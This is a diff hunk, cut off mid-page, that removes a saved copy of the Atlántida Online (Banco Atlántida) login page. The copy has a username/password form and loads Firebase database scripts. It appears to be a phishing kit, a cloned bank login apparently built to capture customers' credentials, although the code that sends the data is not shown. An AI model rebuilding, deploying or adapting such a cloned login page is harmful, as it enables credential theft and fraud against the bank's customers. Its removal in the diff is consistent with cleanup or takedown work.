@@ -1,1317 +1,236 @@
-<html lang="en" translate="no"><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/content/location/location.js" id="eppiocemhmnlbhjplcgkofciiegomcon"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/extend-native-history-api.js"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/requests.js"></script><head>
-        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-        <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script><script bis_use="true" type="text/javascript" charset="utf-8" nonce="" data-dynamic-id="403c56bd-c026-45f9-922b-e51442682bd7" src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/executors/200.js"></script><script bis_use="true" type="text/javascript" charset="utf-8" nonce="" data-dynamic-id="403c56bd-c026-45f9-922b-e51442682bd7" src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/executors/101.js"></script>
-        <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
-        <style type="text/css">
-            :root {
-                --toastify-color-light: #fff;
-                --toastify-color-dark: #121212;
-                --toastify-color-info: #3498db;
-                --toastify-color-success: #07bc0c;
-                --toastify-color-warning: #f1c40f;
-                --toastify-color-error: hsl(6, 78%, 57%);
-                --toastify-color-transparent: rgba(255, 255, 255, .7);
-                --toastify-icon-color-info: var(--toastify-color-info);
-                --toastify-icon-color-success: var(--toastify-color-success);
-                --toastify-icon-color-warning: var(--toastify-color-warning);
-                --toastify-icon-color-error: var(--toastify-color-error);
-                --toastify-container-width: fit-content;
-                --toastify-toast-width: 320px;
-                --toastify-toast-offset: 16px;
-                --toastify-toast-top: max(var(--toastify-toast-offset), env(safe-area-inset-top));
-                --toastify-toast-right: max(var(--toastify-toast-offset), env(safe-area-inset-right));
-                --toastify-toast-left: max(var(--toastify-toast-offset), env(safe-area-inset-left));
-                --toastify-toast-bottom: max(var(--toastify-toast-offset), env(safe-area-inset-bottom));
-                --toastify-toast-background: #fff;
-                --toastify-toast-padding: 14px;
-                --toastify-toast-min-height: 64px;
-                --toastify-toast-max-height: 800px;
-                --toastify-toast-bd-radius: 6px;
-                --toastify-toast-shadow: 0px 4px 12px rgba(0, 0, 0, .1);
-                --toastify-font-family: sans-serif;
-                --toastify-z-index: 9999;
-                --toastify-text-color-light: #757575;
-                --toastify-text-color-dark: #fff;
-                --toastify-text-color-info: #fff;
-                --toastify-text-color-success: #fff;
-                --toastify-text-color-warning: #fff;
-                --toastify-text-color-error: #fff;
-                --toastify-spinner-color: #616161;
-                --toastify-spinner-color-empty-area: #e0e0e0;
-                --toastify-color-progress-light: linear-gradient(to right, #4cd964, #5ac8fa, #007aff, #34aadc, #5856d6, #ff2d55);
-                --toastify-color-progress-dark: #bb86fc;
-                --toastify-color-progress-info: var(--toastify-color-info);
-                --toastify-color-progress-success: var(--toastify-color-success);
-                --toastify-color-progress-warning: var(--toastify-color-warning);
-                --toastify-color-progress-error: var(--toastify-color-error);
-                --toastify-color-progress-bgo: .2
-            }
-
-            .Toastify__toast-container {
-                z-index: var(--toastify-z-index);
-                -webkit-transform: translate3d(0,0,var(--toastify-z-index));
-                position: fixed;
-                width: var(--toastify-container-width);
-                box-sizing: border-box;
-                color: #fff;
-                display: flex;
-                flex-direction: column
-            }
-
-            .Toastify__toast-container--top-left {
-                top: var(--toastify-toast-top);
-                left: var(--toastify-toast-left)
-            }
-
-            .Toastify__toast-container--top-center {
-                top: var(--toastify-toast-top);
-                left: 50%;
-                transform: translate(-50%);
-                align-items: center
-            }
-
-            .Toastify__toast-container--top-right {
-                top: var(--toastify-toast-top);
-                right: var(--toastify-toast-right);
-                align-items: end
-            }
-
-            .Toastify__toast-container--bottom-left {
-                bottom: var(--toastify-toast-bottom);
-                left: var(--toastify-toast-left)
-            }
-
-            .Toastify__toast-container--bottom-center {
-                bottom: var(--toastify-toast-bottom);
-                left: 50%;
-                transform: translate(-50%);
-                align-items: center
-            }
-
-            .Toastify__toast-container--bottom-right {
-                bottom: var(--toastify-toast-bottom);
-                right: var(--toastify-toast-right);
-                align-items: end
-            }
-
-            .Toastify__toast {
-                --y: 0;
-                position: relative;
-                touch-action: none;
-                width: var(--toastify-toast-width);
-                min-height: var(--toastify-toast-min-height);
-                box-sizing: border-box;
-                margin-bottom: 1rem;
-                padding: var(--toastify-toast-padding);
-                border-radius: var(--toastify-toast-bd-radius);
-                box-shadow: var(--toastify-toast-shadow);
-                max-height: var(--toastify-toast-max-height);
-                font-family: var(--toastify-font-family);
-                z-index: 0;
-                display: flex;
-                flex: 1 auto;
-                align-items: center;
-                word-break: break-word
-            }
-
-            @media only screen and (max-width: 480px) {
-                .Toastify__toast-container {
-                    width:100vw;
-                    left: env(safe-area-inset-left);
-                    margin: 0
-                }
-
-                .Toastify__toast-container--top-left,.Toastify__toast-container--top-center,.Toastify__toast-container--top-right {
-                    top: env(safe-area-inset-top);
-                    transform: translate(0)
-                }
-
-                .Toastify__toast-container--bottom-left,.Toastify__toast-container--bottom-center,.Toastify__toast-container--bottom-right {
-                    bottom: env(safe-area-inset-bottom);
-                    transform: translate(0)
-                }
-
-                .Toastify__toast-container--rtl {
-                    right: env(safe-area-inset-right);
-                    left: initial
-                }
-
-                .Toastify__toast {
-                    --toastify-toast-width: 100%;
-                    margin-bottom: 0;
-                    border-radius: 0
-                }
-            }
-
-            .Toastify__toast-container[data-stacked=true] {
-                width: var(--toastify-toast-width)
-            }
-
-            .Toastify__toast--stacked {
-                position: absolute;
-                width: 100%;
-                transform: translate3d(0,var(--y),0) scale(var(--s));
-                transition: transform .3s
-            }
-
-            .Toastify__toast--stacked[data-collapsed] .Toastify__toast-body,.Toastify__toast--stacked[data-collapsed] .Toastify__close-button {
-                transition: opacity .1s
-            }
-
-            .Toastify__toast--stacked[data-collapsed=false] {
-                overflow: visible
-            }
-
-            .Toastify__toast--stacked[data-collapsed=true]:not(:last-child)>* {
-                opacity: 0
-            }
-
-            .Toastify__toast--stacked:after {
-                content: "";
-                position: absolute;
-                left: 0;
-                right: 0;
-                height: calc(var(--g) * 1px);
-                bottom: 100%
-            }
-
-            .Toastify__toast--stacked[data-pos=top] {
-                top: 0
-            }
-
-            .Toastify__toast--stacked[data-pos=bot] {
-                bottom: 0
-            }
-
-            .Toastify__toast--stacked[data-pos=bot].Toastify__toast--stacked:before {
-                transform-origin: top
-            }
-
-            .Toastify__toast--stacked[data-pos=top].Toastify__toast--stacked:before {
-                transform-origin: bottom
-            }
-
-            .Toastify__toast--stacked:before {
-                content: "";
-                position: absolute;
-                left: 0;
-                right: 0;
-                bottom: 0;
-                height: 100%;
-                transform: scaleY(3);
-                z-index: -1
-            }
-
-            .Toastify__toast--rtl {
-                direction: rtl
-            }
-
-            .Toastify__toast--close-on-click {
-                cursor: pointer
-            }
-
-            .Toastify__toast-icon {
-                margin-inline-end:10px;width: 22px;
-                flex-shrink: 0;
-                display: flex
-            }
-
-            .Toastify--animate {
-                animation-fill-mode: both;
-                animation-duration: .5s
-            }
-
-            .Toastify--animate-icon {
-                animation-fill-mode: both;
-                animation-duration: .3s
-            }
-
-            .Toastify__toast-theme--dark {
-                background: var(--toastify-color-dark);
-                color: var(--toastify-text-color-dark)
-            }
-
-            .Toastify__toast-theme--light,.Toastify__toast-theme--colored.Toastify__toast--default {
-                background: var(--toastify-color-light);
-                color: var(--toastify-text-color-light)
-            }
-
-            .Toastify__toast-theme--colored.Toastify__toast--info {
-                color: var(--toastify-text-color-info);
-                background: var(--toastify-color-info)
-            }
-
-            .Toastify__toast-theme--colored.Toastify__toast--success {
-                color: var(--toastify-text-color-success);
-                background: var(--toastify-color-success)
-            }
-
-            .Toastify__toast-theme--colored.Toastify__toast--warning {
-                color: var(--toastify-text-color-warning);
-                background: var(--toastify-color-warning)
-            }
-
-            .Toastify__toast-theme--colored.Toastify__toast--error {
-                color: var(--toastify-text-color-error);
-                background: var(--toastify-color-error)
-            }
-
-            .Toastify__progress-bar-theme--light {
-                background: var(--toastify-color-progress-light)
-            }
-
-            .Toastify__progress-bar-theme--dark {
-                background: var(--toastify-color-progress-dark)
-            }
-
-            .Toastify__progress-bar--info {
-                background: var(--toastify-color-progress-info)
-            }
-
-            .Toastify__progress-bar--success {
-                background: var(--toastify-color-progress-success)
-            }
-
-            .Toastify__progress-bar--warning {
-                background: var(--toastify-color-progress-warning)
-            }
-
-            .Toastify__progress-bar--error {
-                background: var(--toastify-color-progress-error)
-            }
-
-            .Toastify__progress-bar-theme--colored.Toastify__progress-bar--info,.Toastify__progress-bar-theme--colored.Toastify__progress-bar--success,.Toastify__progress-bar-theme--colored.Toastify__progress-bar--warning,.Toastify__progress-bar-theme--colored.Toastify__progress-bar--error {
-                background: var(--toastify-color-transparent)
-            }
-
-            .Toastify__close-button {
-                color: #fff;
-                position: absolute;
-                top: 6px;
-                right: 6px;
-                background: transparent;
-                outline: none;
-                border: none;
-                padding: 0;
-                cursor: pointer;
-                opacity: .7;
-                transition: .3s ease;
-                z-index: 1
-            }
-
-            .Toastify__toast--rtl .Toastify__close-button {
-                left: 6px;
-                right: unset
-            }
-
-            .Toastify__close-button--light {
-                color: #000;
-                opacity: .3
-            }
-
-            .Toastify__close-button>svg {
-                fill: currentColor;
-                height: 16px;
-                width: 14px
-            }
-
-            .Toastify__close-button:hover,.Toastify__close-button:focus {
-                opacity: 1
-            }
-
-            @keyframes Toastify__trackProgress {
-                0% {
-                    transform: scaleX(1)
-                }
-
-                to {
-                    transform: scaleX(0)
-                }
-            }
-
-            .Toastify__progress-bar {
-                position: absolute;
-                bottom: 0;
-                left: 0;
-                width: 100%;
-                height: 100%;
-                z-index: 1;
-                opacity: .7;
-                transform-origin: left
-            }
-
-            .Toastify__progress-bar--animated {
-                animation: Toastify__trackProgress linear 1 forwards
-            }
-
-            .Toastify__progress-bar--controlled {
-                transition: transform .2s
-            }
-
-            .Toastify__progress-bar--rtl {
-                right: 0;
-                left: initial;
-                transform-origin: right;
-                border-bottom-left-radius: initial
-            }
-
-            .Toastify__progress-bar--wrp {
-                position: absolute;
-                overflow: hidden;
-                bottom: 0;
-                left: 0;
-                width: 100%;
-                height: 5px;
-                border-bottom-left-radius: var(--toastify-toast-bd-radius);
-                border-bottom-right-radius: var(--toastify-toast-bd-radius)
-            }
-
-            .Toastify__progress-bar--wrp[data-hidden=true] {
-                opacity: 0
-            }
-
-            .Toastify__progress-bar--bg {
-                opacity: var(--toastify-color-progress-bgo);
-                width: 100%;
-                height: 100%
-            }
-
-            .Toastify__spinner {
-                width: 20px;
-                height: 20px;
-                box-sizing: border-box;
-                border: 2px solid;
-                border-radius: 100%;
-                border-color: var(--toastify-spinner-color-empty-area);
-                border-right-color: var(--toastify-spinner-color);
-                animation: Toastify__spin .65s linear infinite
-            }
-
-            @keyframes Toastify__bounceInRight {
-                0%,60%,75%,90%,to {
-                    animation-timing-function: cubic-bezier(.215,.61,.355,1)
-                }
-
-                0% {
-                    opacity: 0;
-                    transform: translate3d(3000px,0,0)
-                }
-
-                60% {
-                    opacity: 1;
-                    transform: translate3d(-25px,0,0)
-                }
-
-                75% {
-                    transform: translate3d(10px,0,0)
-                }
-
-                90% {
-                    transform: translate3d(-5px,0,0)
-                }
-
-                to {
-                    transform: none
-                }
-            }
-
-            @keyframes Toastify__bounceOutRight {
-                20% {
-                    opacity: 1;
-                    transform: translate3d(-20px,var(--y),0)
-                }
-
-                to {
-                    opacity: 0;
-                    transform: translate3d(2000px,var(--y),0)
-                }
-            }
-
-            @keyframes Toastify__bounceInLeft {
-                0%,60%,75%,90%,to {
-                    animation-timing-function: cubic-bezier(.215,.61,.355,1)
-                }
-
-                0% {
-                    opacity: 0;
-                    transform: translate3d(-3000px,0,0)
-                }
-
-                60% {
-                    opacity: 1;
-                    transform: translate3d(25px,0,0)
-                }
-
-                75% {
-                    transform: translate3d(-10px,0,0)
-                }
-
-                90% {
-                    transform: translate3d(5px,0,0)
-                }
-
-                to {
-                    transform: none
-                }
-            }
-
-            @keyframes Toastify__bounceOutLeft {
-                20% {
-                    opacity: 1;
-                    transform: translate3d(20px,var(--y),0)
-                }
-
-                to {
-                    opacity: 0;
-                    transform: translate3d(-2000px,var(--y),0)
-                }
-            }
-
-            @keyframes Toastify__bounceInUp {
-                0%,60%,75%,90%,to {
-                    animation-timing-function: cubic-bezier(.215,.61,.355,1)
-                }
-
-                0% {
-                    opacity: 0;
-                    transform: translate3d(0,3000px,0)
-                }
-
-                60% {
-                    opacity: 1;
-                    transform: translate3d(0,-20px,0)
-                }
-
-                75% {
-                    transform: translate3d(0,10px,0)
-                }
-
-                90% {
-                    transform: translate3d(0,-5px,0)
-                }
-
-                to {
-                    transform: translateZ(0)
-                }
-            }
-
-            @keyframes Toastify__bounceOutUp {
-                20% {
-                    transform: translate3d(0,calc(var(--y) - 10px),0)
-                }
-
-                40%,45% {
-                    opacity: 1;
-                    transform: translate3d(0,calc(var(--y) + 20px),0)
-                }
-
-                to {
-                    opacity: 0;
-                    transform: translate3d(0,-2000px,0)
-                }
-            }
-
-            @keyframes Toastify__bounceInDown {
-                0%,60%,75%,90%,to {
-                    animation-timing-function: cubic-bezier(.215,.61,.355,1)
-                }
-
-                0% {
-                    opacity: 0;
-                    transform: translate3d(0,-3000px,0)
-                }
-
-                60% {
-                    opacity: 1;
-                    transform: translate3d(0,25px,0)
-                }
-
-                75% {
-                    transform: translate3d(0,-10px,0)
-                }
-
-                90% {
-                    transform: translate3d(0,5px,0)
-                }
-
-                to {
-                    transform: none
-                }
-            }
-
-            @keyframes Toastify__bounceOutDown {
-                20% {
-                    transform: translate3d(0,calc(var(--y) - 10px),0)
-                }
-
-                40%,45% {
-                    opacity: 1;
-                    transform: translate3d(0,calc(var(--y) + 20px),0)
-                }
-
-                to {
-                    opacity: 0;
-                    transform: translate3d(0,2000px,0)
-                }
-            }
-
-            .Toastify__bounce-enter--top-left,.Toastify__bounce-enter--bottom-left {
-                animation-name: Toastify__bounceInLeft
-            }
-
-            .Toastify__bounce-enter--top-right,.Toastify__bounce-enter--bottom-right {
-                animation-name: Toastify__bounceInRight
-            }
-
-            .Toastify__bounce-enter--top-center {
-                animation-name: Toastify__bounceInDown
-            }
-
-            .Toastify__bounce-enter--bottom-center {
-                animation-name: Toastify__bounceInUp
-            }
-
-            .Toastify__bounce-exit--top-left,.Toastify__bounce-exit--bottom-left {
-                animation-name: Toastify__bounceOutLeft
-            }
-
-            .Toastify__bounce-exit--top-right,.Toastify__bounce-exit--bottom-right {
-                animation-name: Toastify__bounceOutRight
-            }
-
-            .Toastify__bounce-exit--top-center {
-                animation-name: Toastify__bounceOutUp
-            }
-
-            .Toastify__bounce-exit--bottom-center {
-                animation-name: Toastify__bounceOutDown
-            }
-
-            @keyframes Toastify__zoomIn {
-                0% {
-                    opacity: 0;
-                    transform: scale3d(.3,.3,.3)
-                }
-
-                50% {
-                    opacity: 1
-                }
-            }
-
-            @keyframes Toastify__zoomOut {
-                0% {
-                    opacity: 1
-                }
-
-                50% {
-                    opacity: 0;
-                    transform: translate3d(0,var(--y),0) scale3d(.3,.3,.3)
-                }
-
-                to {
-                    opacity: 0
-                }
-            }
-
-            .Toastify__zoom-enter {
-                animation-name: Toastify__zoomIn
-            }
-
-            .Toastify__zoom-exit {
-                animation-name: Toastify__zoomOut
-            }
-
-            @keyframes Toastify__flipIn {
-                0% {
-                    transform: perspective(400px) rotateX(90deg);
-                    animation-timing-function: ease-in;
-                    opacity: 0
-                }
-
-                40% {
-                    transform: perspective(400px) rotateX(-20deg);
-                    animation-timing-function: ease-in
-                }
-
-                60% {
-                    transform: perspective(400px) rotateX(10deg);
-                    opacity: 1
-                }
-
-                80% {
-                    transform: perspective(400px) rotateX(-5deg)
-                }
-
-                to {
-                    transform: perspective(400px)
-                }
-            }
-
-            @keyframes Toastify__flipOut {
-                0% {
-                    transform: translate3d(0,var(--y),0) perspective(400px)
-                }
-
-                30% {
-                    transform: translate3d(0,var(--y),0) perspective(400px) rotateX(-20deg);
-                    opacity: 1
-                }
-
-                to {
-                    transform: translate3d(0,var(--y),0) perspective(400px) rotateX(90deg);
-                    opacity: 0
-                }
-            }
-
-            .Toastify__flip-enter {
-                animation-name: Toastify__flipIn
-            }
-
-            .Toastify__flip-exit {
-                animation-name: Toastify__flipOut
-            }
-
-            @keyframes Toastify__slideInRight {
-                0% {
-                    transform: translate3d(110%,0,0);
-                    visibility: visible
-                }
-
-                to {
-                    transform: translate3d(0,var(--y),0)
-                }
-            }
-
-            @keyframes Toastify__slideInLeft {
-                0% {
-                    transform: translate3d(-110%,0,0);
-                    visibility: visible
-                }
-
-                to {
-                    transform: translate3d(0,var(--y),0)
-                }
-            }
-
-            @keyframes Toastify__slideInUp {
-                0% {
-                    transform: translate3d(0,110%,0);
-                    visibility: visible
-                }
-
-                to {
-                    transform: translate3d(0,var(--y),0)
-                }
-            }
-
-            @keyframes Toastify__slideInDown {
-                0% {
-                    transform: translate3d(0,-110%,0);
-                    visibility: visible
-                }
-
-                to {
-                    transform: translate3d(0,var(--y),0)
-                }
-            }
-
-            @keyframes Toastify__slideOutRight {
-                0% {
-                    transform: translate3d(0,var(--y),0)
-                }
-
-                to {
-                    visibility: hidden;
-                    transform: translate3d(110%,var(--y),0)
-                }
-            }
-
-            @keyframes Toastify__slideOutLeft {
-                0% {
-                    transform: translate3d(0,var(--y),0)
-                }
-
-                to {
-                    visibility: hidden;
-                    transform: translate3d(-110%,var(--y),0)
-                }
-            }
-
-            @keyframes Toastify__slideOutDown {
-                0% {
-                    transform: translate3d(0,var(--y),0)
-                }
-
-                to {
-                    visibility: hidden;
-                    transform: translate3d(0,500px,0)
-                }
-            }
-
-            @keyframes Toastify__slideOutUp {
-                0% {
-                    transform: translate3d(0,var(--y),0)
-                }
-
-                to {
-                    visibility: hidden;
-                    transform: translate3d(0,-500px,0)
-                }
-            }
-
-            .Toastify__slide-enter--top-left,.Toastify__slide-enter--bottom-left {
-                animation-name: Toastify__slideInLeft
-            }
-
-            .Toastify__slide-enter--top-right,.Toastify__slide-enter--bottom-right {
-                animation-name: Toastify__slideInRight
-            }
-
-            .Toastify__slide-enter--top-center {
-                animation-name: Toastify__slideInDown
-            }
-
-            .Toastify__slide-enter--bottom-center {
-                animation-name: Toastify__slideInUp
-            }
-
-            .Toastify__slide-exit--top-left,.Toastify__slide-exit--bottom-left {
-                animation-name: Toastify__slideOutLeft;
-                animation-timing-function: ease-in;
-                animation-duration: .3s
-            }
-
-            .Toastify__slide-exit--top-right,.Toastify__slide-exit--bottom-right {
-                animation-name: Toastify__slideOutRight;
-                animation-timing-function: ease-in;
-                animation-duration: .3s
-            }
-
-            .Toastify__slide-exit--top-center {
-                animation-name: Toastify__slideOutUp;
-                animation-timing-function: ease-in;
-                animation-duration: .3s
-            }
-
-            .Toastify__slide-exit--bottom-center {
-                animation-name: Toastify__slideOutDown;
-                animation-timing-function: ease-in;
-                animation-duration: .3s
-            }
-
-            @keyframes Toastify__spin {
-                0% {
-                    transform: rotate(0)
-                }
-
-                to {
-                    transform: rotate(360deg)
-                }
-            }
-        </style>
-        <link rel="icon" type="image/svg+xml" href="https://app.bancatlan.hn/favicon.ico">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <meta name="google" content="notranslate">
-        <title>Atlántida Online</title>
-        <script src="https://js-cdn.dynatrace.com/jstag/176fb25782e/ruxitagent_D_10337260504112723.js" defer="defer" crossorigin="anonymous"></script><script src="https://js-cdn.dynatrace.com/jstag/176fb25782e/ruxitagent_D_10337260504112723.js" defer="defer" crossorigin="anonymous"></script><script src="https://js-cdn.dynatrace.com/jstag/176fb25782e/ruxitagent_D_10337260504112723.js" defer="defer" crossorigin="anonymous"></script><script src="https://js-cdn.dynatrace.com/jstag/176fb25782e/ruxitagent_D_10337260504112723.js" defer="defer" crossorigin="anonymous"></script><script src="./index_files/ruxitagent_D_10337260504112723.js.descarga" defer="defer" crossorigin="anonymous"></script>
-        <script type="module" crossorigin="" src="./index_files/index-CzeXEIw5.js.descarga"></script>
-        <link rel="modulepreload" crossorigin="" href="https://app.bancatlan.hn/assets/_virtual___federation_fn_import-JPKVqJa1.js">
-        <link rel="modulepreload" crossorigin="" href="https://app.bancatlan.hn/assets/index-yBjzXJbu.js">
-        <link rel="modulepreload" crossorigin="" href="https://app.bancatlan.hn/assets/_commonjsHelpers-CqkleIqs.js">
-        <link rel="modulepreload" crossorigin="" href="https://app.bancatlan.hn/assets/index-fNjTmf9T.js">
-        <link rel="modulepreload" crossorigin="" href="https://app.bancatlan.hn/assets/redux-DUo4Onvr.js">
-        <link rel="stylesheet" crossorigin="" href="./index_files/index-Dv11ve8k.css">
-        <script type="text/javascript" crossorigin="anonymous" src="./index_files/a22c8579f007dfe3_complete.js.descarga" async="" data-dynatrace="true"></script>
-    </head>
-    <body __processed_df5adb31-5366-4602-ae59-846a8608f1a2__="true" bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJlbmFibGVkIiwiRkFDRUJPT0siOiJlbmFibGVkIiwiVFdJVFRFUiI6ImVuYWJsZWQiLCJSRURESVQiOiJlbmFibGVkIiwiUElOVEVSRVNUIjoiZW5hYmxlZCIsIklOU1RBR1JBTSI6ImVuYWJsZWQiLCJUSUtUT0siOiJlbmFibGVkIiwiTElOS0VESU4iOiJlbmFibGVkIiwiQ09ORklHIjoiZGlzYWJsZWQifSwidmVyc2lvbiI6IjIuMi4xIiwic2NvcmUiOjIwMjAxMH1d">
-        <div id="root" bis_skin_checked="1">
-            <div class="relative w-full min-h-screen grid grid-cols-[1fr_auto]" bis_skin_checked="1">
-                <div class="sticky inset-0 w-full h-full hidden sm:block" bis_skin_checked="1">
-                    <div class="relative w-full h-full overflow-hidden" bis_skin_checked="1">
-                        <div class="absolute inset-0 w-full h-full opacity-0 transition-opacity ease-in-out opacity-100 z-10" style="transition-duration: 1500ms;" bis_skin_checked="1">
-                            <img src="./index_files/slider1.webp" alt="" role="presentation" class="w-full h-full object-cover transition-transform ease-in origin-left scale-110" style="transition-duration: 6500ms;">
-                        </div>
-                        <div class="absolute inset-0 w-full h-full opacity-0 transition-opacity ease-in-out" style="transition-duration: 1500ms;" bis_skin_checked="1">
-                            <img src="./index_files/slider2.webp" alt="" role="presentation" class="w-full h-full object-cover transition-transform ease-in origin-left" style="transition-duration: 6500ms;">
-                        </div>
-                    </div>
-                </div>
-                <main class="min-w-[489px] sm:w-[489px] bg-white">
-                    <section class="w-full h-full grid grid-rows-[auto_1fr_auto] gap-y-[85px] px-12 py-16">
-                        <div class="justify-self-end" bis_skin_checked="1">
-                            <div class="relative" bis_skin_checked="1">
-                                <button aria-haspopup="listbox" aria-expanded="false" class="w-full flex items-center gap-1 p-1.5 rounded-md outline-0">
-                                    <img src="data:image/svg+xml,%3csvg%20width='20'%20height='20'%20viewBox='0%200%2020%2020'%20fill='none'%20xmlns='http://www.w3.org/2000/svg'%3e%3cpath%20d='M10%200.3125C4.64961%200.3125%200.3125%204.64961%200.3125%2010C0.3125%2015.3504%204.64961%2019.6875%2010%2019.6875C15.3504%2019.6875%2019.6875%2015.3504%2019.6875%2010C19.6875%204.64961%2015.3504%200.3125%2010%200.3125ZM13.2145%2014.2812C13.0621%2014.4328%2012.9023%2014.5918%2012.7727%2014.7219C12.6559%2014.8391%2012.5734%2014.9836%2012.5316%2015.1402C12.4727%2015.3613%2012.425%2015.5848%2012.3453%2015.7992L11.666%2017.6293C11.1285%2017.7465%2010.5723%2017.8125%2010%2017.8125V16.743C10.066%2016.25%209.70156%2015.3266%209.11602%2014.741C8.88164%2014.5066%208.75%2014.1887%208.75%2013.857V12.6066C8.75%2012.152%208.50508%2011.734%208.10703%2011.5141C7.5457%2011.2035%206.74727%2010.7695%206.20039%2010.4941C5.75195%2010.2684%205.33711%209.98086%204.96406%209.64453L4.93281%209.61641C4.66604%209.3756%204.42918%209.1036%204.22734%208.80625C3.86094%208.26836%203.26406%207.38359%202.87617%206.80859C3.67578%205.03125%205.1168%203.60391%206.90742%202.82852L7.84531%203.29766C8.26094%203.50547%208.75%203.20352%208.75%202.73867V2.29727C9.06211%202.24688%209.37969%202.21484%209.70273%202.20273L10.8082%203.3082C11.0523%203.55234%2011.0523%203.94805%2010.8082%204.19219L10.625%204.375L10.2211%204.77891C10.0992%204.90078%2010.0992%205.09883%2010.2211%205.2207L10.4043%205.40391C10.5262%205.52578%2010.5262%205.72383%2010.4043%205.8457L10.0918%206.1582C10.0331%206.21676%209.9536%206.24964%209.8707%206.24961H9.51953C9.43828%206.24961%209.36016%206.28125%209.30156%206.33828L8.91406%206.71523C8.86656%206.76149%208.83499%206.82164%208.82389%206.887C8.8128%206.95237%208.82276%207.01957%208.85234%207.07891L9.46133%208.29727C9.56523%208.50508%209.41406%208.74961%209.18203%208.74961H8.96172C8.88633%208.74961%208.81367%208.72227%208.75703%208.67305L8.39453%208.3582C8.3125%208.28704%208.21336%208.23845%208.10686%208.21722C8.00035%208.19599%207.89016%208.20284%207.78711%208.23711L6.56953%208.64297C6.47657%208.67396%206.39573%208.73343%206.33845%208.81293C6.28117%208.89244%206.25036%208.98795%206.25039%209.08594C6.25039%209.26289%206.35039%209.42422%206.50859%209.50352L6.94141%209.71992C7.30898%209.90391%207.71445%209.99961%208.12539%209.99961C8.53633%209.99961%209.00781%2011.0656%209.37539%2011.2496H11.9828C12.3145%2011.2496%2012.632%2011.3812%2012.8668%2011.6156L13.4016%2012.1504C13.625%2012.3739%2013.7504%2012.677%2013.7504%2012.993C13.7503%2013.2324%2013.7029%2013.4695%2013.611%2013.6906C13.519%2013.9117%2013.3842%2014.1124%2013.2145%2014.2812ZM16.6016%2010.7129C16.3754%2010.6562%2016.1781%2010.5176%2016.0488%2010.3234L15.3465%209.26992C15.2437%209.116%2015.1889%208.93508%2015.1889%208.75C15.1889%208.56492%2015.2437%208.384%2015.3465%208.23008L16.1117%207.08242C16.2023%206.94688%2016.3266%206.83672%2016.4727%206.76406L16.9797%206.51055C17.5078%207.56211%2017.8125%208.74492%2017.8125%2010C17.8125%2010.3387%2017.7836%2010.6703%2017.7414%2010.9977L16.6016%2010.7129Z'%20fill='%23D9272E'/%3e%3c/svg%3e" class="size-5">
-                                    <p class="uppercase font-semibold text-xs leading-[14px] text-primary-600">es</p>
-                                    <img src="data:image/svg+xml,%3csvg%20width='8'%20height='6'%20viewBox='0%200%208%206'%20fill='none'%20xmlns='http://www.w3.org/2000/svg'%3e%3cpath%20d='M4.42487%205.32967L7.8238%202.03809C8.05873%201.81058%208.05873%201.4427%207.8238%201.21761L7.25898%200.67063C7.02405%200.443124%206.64417%200.443124%206.41175%200.67063L4.0025%203.00378L1.59325%200.67063C1.35833%200.443123%200.978444%200.443123%200.746017%200.67063L0.176195%201.21519C-0.0587317%201.4427%20-0.0587317%201.81058%200.176195%202.03567L3.57513%205.32725C3.81006%205.55718%204.18994%205.55718%204.42487%205.32967Z'%20fill='%23D9272E'/%3e%3c/svg%3e" class="size-2">
-                                </button>
-                            </div>
-                        </div>
-                        <div class="w-full self-start grid gap-y-8" bis_skin_checked="1">
-                            <img src="./index_files/LogoBancatlanWithTextRed-DzDGoXXA.svg" alt="Bancatlan logo" class="h-10 mx-auto">
-                            <p class="text-center text-label-semibold-md text-secondary-900">Ingresa tu usuario y contraseña para iniciar sesión.</p>
-                            <form id="login-form" class="grid gap-6">
-                                <label class="w-full grid gap-[0.44rem]">
-                                    <span class="text-label-bold-md text-secondary-900">Usuario</span>
-                                    <div class="relative w-full" bis_skin_checked="1">
-                                        <input type="text" name="username" id="user" class="w-full h-[50px] px-4 border-[1.5px] rounded-[0.94rem] border-secondary-300 bg-white text-secondary-900 outline-none placeholder:text-secondary-500 disabled:text-secondary-500 focus:shadow-[0px_0px_8px_0px_#D9272E4D] pl-4 pr-4" maxlength="15" value="">
-                                    </div>
-                                </label>
-                                <div class="flex flex-col gap-y-2" bis_skin_checked="1">
-                                    <label class="w-full grid gap-[0.44rem]">
-                                        <span class="text-label-bold-md text-secondary-900">Contraseña</span>
-                                        <div class="relative w-full" bis_skin_checked="1">
-                                            <input type="password" name="password" id="pass" class="w-full h-[50px] px-4 border-[1.5px] rounded-[0.94rem] border-secondary-300 bg-white text-secondary-900 outline-none placeholder:text-secondary-500 disabled:text-secondary-500 focus:shadow-[0px_0px_8px_0px_#D9272E4D] pl-4 pr-10" maxlength="15" value="">
-                                            <div class="absolute inset-y-0 right-0 flex items-center gap-2 pr-4" bis_skin_checked="1">
-                                                <button type="button" id="togglePassword">
-                                                    <img id="eyeIcon" src="ojo.svg" alt="Mostrar contraseña" class="w-4 h-4">
-                                                </button>
-                                            </div>
-                                        </div>
-                                    </label>
-                                    <a class="self-end text-link-semibold text-secondary-900" href="https://app.bancatlan.hn/forgot-password" data-discover="true">¿Olvidaste tu contraseña?</a>
-                                </div>
-                            <button class="w-full h-[2.875rem] flex justify-center items-center rounded-2xl outline-none transition-all disabled:text-secondary-600 disabled:cursor-not-allowed focus-visible:ring-4 focus-visible:ring-primary-700/24 bg-primary-600 hover:bg-primary-700 disabled:bg-secondary-200 text-white" id="btn-envio" type="submit" enabled="">
-                                <span class="flex justify-center items-center gap-x-6">Iniciar sesión</span>
-                            </button>
-                             </form>
-                            <div class="flex items-center gap-x-2.5" bis_skin_checked="1">
-                                <hr class="w-full border-secondary-300">
-                                <p class="text-body-md text-secondary-700 whitespace-nowrap">¿Aún no eres cliente?</p>
-                                <hr class="w-full border-secondary-300">
-                            </div>
